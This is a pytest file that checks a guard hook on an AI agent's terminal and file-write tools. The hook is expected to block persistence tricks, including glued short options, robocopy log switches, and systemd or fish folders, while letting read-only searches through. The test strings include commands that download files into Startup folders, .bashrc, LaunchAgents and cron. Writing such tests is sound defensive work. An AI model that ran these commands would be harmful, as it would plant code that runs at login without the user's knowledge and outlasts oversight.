"""Round-5 persistence rules. Every argument is read the way the program reads it: a short option
may carry its value glued on (-tStartup), a switch may carry a plus before its colon (/LOG+:), and an
assignment before the command is part of it. The folder a later command runs in cannot be the
systemd folder. A search tool never writes, so a bare search word is not a destination."""

import pytest

from hands import messages
from test_lane_r3a_witness import fresh_tool_session, hook  # noqa: F401  (fixtures)

PERSISTENCE = {"action": "block", "message": messages.WITNESS_AUTOSTART_BLOCKED}
START_MENU = "/c/Users/x/AppData/Roaming/Microsoft/Windows/Start Menu/Programs"


@pytest.mark.parametrize(
    "command",
    [
        "cp -tStartup /c/Users/x/evil.cmd",
        "tar -xf /c/Users/x/e.tar -CStartup",
        "curl -sLoStartup/evil.cmd https://example.com/e",
        "7z x a.zip -oStartup",
        "cp -tautostart /tmp/e.desktop",
        "cp -tLaunchAgents /tmp/e.plist",
        "curl -o.bashrc https://example.com/e",
        "wget -O.bashrc https://example.com/e",
        "wget -PStartup https://example.com/e.cmd",
        "unzip -dStartup a.zip",
        "curl -4oStartup/e.cmd https://example.com/e",
        "7z x a.zip '-oStartup'",
        '7z x a.zip -o"Startup."',
        "tar -xf e.tar -Ccron",
        "cp -tprofile.d e.sh",
        "curl -o.profile https://example.com/e",
        "cp -tLaunchDaemons e.plist",
        "dd if=e.cmd of=Startup/a=b.cmd",
    ],
)
def test_a_startup_path_glued_to_a_short_option_is_blocked(hook, command):
    assert hook("terminal", {"command": command}) == PERSISTENCE


@pytest.mark.parametrize(
    "command",
    [
        "gcc -o./build/startup main.c",
        "curl -o./mystartup https://example.com/x",
        "curl -sLo out.html https://example.com/",
        "tar -xzf archive.tar.gz",
        "tar -xf a.tar -Cbuild",
        "cp -t/c/Users/x/Startup notes.txt",
        "git log -Sfoo",
        "ls -la",
    ],
)
def test_ordinary_glued_options_still_reach_the_helper(hook, command):
    assert hook("terminal", {"command": command})["action"] == "approve"


@pytest.mark.parametrize(
    "command",
    [
        "cd /home/x/.config/systemd",
        "cd -P /home/x/.config/systemd",
        "pushd /home/x/.config/systemd",
        "cd /home/x/.local/share/systemd",
        "cd systemd",
        "cd /home/x/.config/systemd/user/..",
        "CDPATH=/home/x/.config/systemd cd user",
        f"HOME='{START_MENU}/Startup' cd",
        "cp /tmp/e.service user/e.service",
        "mkdir -p user/default.target.wants",
        "ln -s ../e.service user/default.target.wants/e.service",
        "cd /home/x/.config/plasma-workspace",
        "cd /home/x/.config/fish",
    ],
)
def test_a_systemd_user_unit_through_a_relative_path_is_blocked(hook, command):
    assert hook("terminal", {"command": command}) == PERSISTENCE


def test_a_terminal_workdir_in_the_systemd_folder_is_blocked(hook):
    for workdir in ("/home/x/.config/systemd", "/home/x/.local/share/systemd", "/home/x/.config/fish"):
        assert hook("terminal", {"command": "ls", "workdir": workdir}) == PERSISTENCE


@pytest.mark.parametrize(
    "path",
    [
        "user/e.service",
        "user/e.timer",
        "user/e.service.d/override.conf",
        "user/default.target.wants/e.service",
        "/home/x/.config/systemd/user.control/e.service",
        "/home/x/.config/autostart-scripts/e.sh",
        "/home/x/.config/plasma-workspace/env/e.sh",
        "/home/x/.config/fish/config.fish",
        "/home/x/.config/fish/conf.d/e.fish",
        "/home/x/.config/fish/functions/fish_prompt.fish",
    ],
)
def test_systemd_unit_and_login_folder_writes_are_blocked(hook, path):
    assert hook("write_file", {"path": path, "content": "[Service]"}) == PERSISTENCE


@pytest.mark.parametrize(
    "command",
    [
        "git diff user/models.py",
        "ls user",
        "cat /etc/systemd/journald.conf",
        "ls /etc/systemd",
        "ls /etc/systemd/system/multi-user.target.wants",
        "cat /usr/lib/systemd/system/ssh.service",
    ],
)
def test_ordinary_user_folders_and_systemd_reads_still_reach_the_helper(hook, command):
    assert hook("terminal", {"command": command})["action"] == "approve"


def test_an_ordinary_user_folder_write_still_reaches_the_helper(hook):
    assert hook("write_file", {"path": "/home/x/user/models.py", "content": "x"})["action"] == "approve"


@pytest.mark.parametrize(
    "switch",
    [
        "/LOG+:Startup\\e.cmd",
        "/LOG+:Programs/Startup/e.cmd",
        "/UNILOG+:Startup/e.cmd",
        "/UNILOG+:Programs\\Startup\\e.cmd",
        "/LOG:Startup\\e.cmd",
    ],
)
def test_a_switch_with_a_plus_before_its_colon_is_read_as_a_path(hook, switch):
    command = f"MSYS_NO_PATHCONV=1 robocopy src dst '{switch}'"
    assert hook("terminal", {"command": command}) == PERSISTENCE


def test_a_plus_switch_with_an_ordinary_log_path_still_reaches_the_helper(hook):
    command = "MSYS_NO_PATHCONV=1 robocopy src dst '/LOG+:C:\\Users\\x\\log.txt'"
    assert hook("terminal", {"command": command})["action"] == "approve"


@pytest.mark.parametrize(
    "command",
    [
        "rg -n startup src",
        "rg cron hermes-hands",
        "git log --oneline --grep=startup",
        "git grep -n autostart",
        "grep -rn profile.d docs",
        "grep -estartup notes.txt",
        "findstr startup notes.txt",
        "systemctl --user status cron",
        "MSYS_NO_PATHCONV=1 wmic startup get caption,command",
        "netsh wlan show profile",
        "netsh wlan delete profile name=x",
    ],
)
def test_search_words_and_read_only_startup_checks_reach_the_helper(hook, command):
    assert hook("terminal", {"command": command})["action"] == "approve"


@pytest.mark.parametrize(
    "command",
    [
        "git log --output=Startup/e.cmd",
        "git log --output=profile",
        "git log --grep=x --output=profile",
        "grep -r x /home/x/.config/autostart",
        "grep x .bashrc",
        f"rg x '{START_MENU}/Startup'",
        "netsh wlan export profile folder=Startup",
        "MSYS_NO_PATHCONV=1 wmic /output:Startup startup get caption",
        "MSYS_NO_PATHCONV=1 wmic '/output:Startup\\e.txt' startup get caption",
        "MSYS_NO_PATHCONV=1 netsh advfirewall export profile",
    ],
)
def test_a_startup_path_or_written_file_in_a_search_or_keyword_tool_is_still_blocked(hook, command):
    assert hook("terminal", {"command": command}) == PERSISTENCE


@pytest.mark.parametrize(
    "command",
    ["cp e profile", "cp e crontab", "cp e rc.local", "cp e bashrc", "cp e zshenv"],
)
def test_a_bare_profile_or_crontab_name_is_blocked_like_a_write(hook, command):
    assert hook("terminal", {"command": command}) == PERSISTENCE
    assert hook("write_file", {"path": command.rsplit(" ", 1)[-1], "content": "x"}) == PERSISTENCE
